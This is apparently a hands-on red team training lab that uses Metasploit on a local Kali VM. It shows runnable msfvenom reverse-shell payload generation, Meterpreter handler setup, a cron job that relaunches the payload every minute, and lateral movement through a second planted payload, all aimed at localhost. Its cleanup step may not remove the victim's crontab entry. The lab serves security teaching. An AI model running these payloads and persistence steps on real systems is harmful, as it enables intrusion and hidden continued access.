
# Lab: Simulate a Network Breach (Red Team Exercise)

**Estimated time:** 30 minutes  
**Environment:** Kali Linux (self-contained local VM)

## Overview

This lab simulates a complete Red Team attack lifecycle using Metasploit on a Kali Linux virtual machine. The exercise walks through reconnaissance, exploitation, post-exploitation, persistence, lateral movement, detection, and cleanup — all mapped conceptually to the MITRE ATT&CK framework.

The lab is fully self-contained and does **not** target external systems.

---

## Learning Objectives

By completing this lab, you will be able to:

- Perform simulated reconnaissance
- Exploit a local vulnerable service using a reverse shell payload
- Simulate credential harvesting and privilege escalation attempts
- Establish persistence using cron
- Simulate lateral movement across user accounts
- Identify indicators of compromise
- Clean up artifacts after an intrusion

---

## Exercise 1: Simulate a Vulnerable Target

This step creates a low-privilege user to represent an initial foothold.

### Create a restricted user

```bash
sudo adduser victim --disabled-password --gecos ""
````

### Generate and deliver a reverse shell payload

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=5555 -f elf -o eb_payload.elf
chmod +x eb_payload.elf
sudo cp eb_payload.elf /home/victim/
sudo chown victim:victim /home/victim/eb_payload.elf
```

**Why this matters:**
Attackers often plant remote access tools in user directories after compromising low-privilege accounts.

---

## Exercise 2: Perform Reconnaissance

Reconnaissance maps to the **Discovery** phase of MITRE ATT&CK.

### Launch Metasploit

```bash
msfconsole
```

### Scan for open ports

```text
use auxiliary/scanner/portscan/tcp
set RHOSTS 127.0.0.1
set PORTS 21,22,80,139,445
set THREADS 10
run
```

**Why this matters:**
Port scanning reveals exposed services that may be exploitable.

---

## Exercise 3: Exploit and Gain a Session

This simulates successful exploitation via payload execution.

### Configure the handler in Metasploit

```text
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 5555
run
```

### Execute the payload as the victim user

```bash
sudo -u victim /home/victim/eb_payload.elf
```

### Interact with the session

```text
background
sessions
sessions -i 1
```

**Why this matters:**
This represents the moment of initial interactive control.

---

## Exercise 4: Post-Exploitation – Credential Access

Attackers frequently search for improperly stored credentials.

### In Meterpreter

```text
getuid
sysinfo
shell
```

### Simulate credential discovery

```bash
echo "admin:pass123" > /home/victim/creds.txt
cat /home/victim/creds.txt
exit
```

**Why this matters:**
Plaintext credentials remain a common failure point in real breaches.

---

## Exercise 5: Simulated Privilege Escalation (Expected to Fail)

### Attempt escalation

```text
getsystem
```

**Why this matters:**
Privilege escalation is not guaranteed and often fails on hardened systems.

---

## Exercise 6: Establish Persistence

Persistence ensures access after reboots or session loss.

### Create a cron-based persistence mechanism

```text
shell
```

```bash
echo "* * * * * /home/victim/eb_payload.elf" | crontab -
exit
```

### Listen for reconnects

```bash
nc -lvnp 5555
```

**Why this matters:**
Scheduled tasks are a common persistence technique on Linux systems.

---

## Exercise 7: Simulate Lateral Movement

This simulates pivoting to another user account.

### Create a second user and payload

```bash
sudo adduser lateral --disabled-password --gecos ""
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=7777 -f elf -o lateral_payload.elf
chmod +x lateral_payload.elf
sudo cp lateral_payload.elf /home/lateral/
sudo chown lateral:lateral /home/lateral/lateral_payload.elf
sudo -u lateral /home/lateral/lateral_payload.elf
```

### Handle the new session in Metasploit

```text
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 7777
run
```

```text
background
sessions
```

**Why this matters:**
Lateral movement increases attacker reach and impact within an environment.

---

## Challenge Exercise 8: Detect Persistence and Lateral Movement

Switch to a defensive mindset.

### Suggested checks

* Inspect cron jobs: `crontab -l`
* Review `/home` directories for suspicious binaries
* Check running processes and listening ports
* Review authentication logs (`/var/log/auth.log`)

**Why this matters:**
Manual inspection remains critical for incident response and threat hunting.

---

## Exercise 9: Full Cleanup

Restoring system trust requires complete artifact removal.

### Remove persistence, payloads, and users

```bash
sudo crontab -r
sudo rm /home/victim/eb_payload.elf
sudo rm /home/victim/creds.txt
sudo deluser --remove-home victim
sudo rm /home/lateral/lateral_payload.elf
sudo deluser --remove-home lateral
```

---

## Summary

In this lab you:

* Simulated an initial low-privilege compromise
* Performed reconnaissance and exploitation
* Gained Meterpreter sessions
* Simulated credential access and privilege escalation attempts
* Established persistence
* Executed lateral movement
* Identified indicators of compromise
* Fully cleaned up the environment

This lab provides an end-to-end view of a network breach from both attacker and defender perspectives.

---

**Disclaimer:**
This lab is for educational use only and must be performed only in environments you own or are explicitly authorized to test.
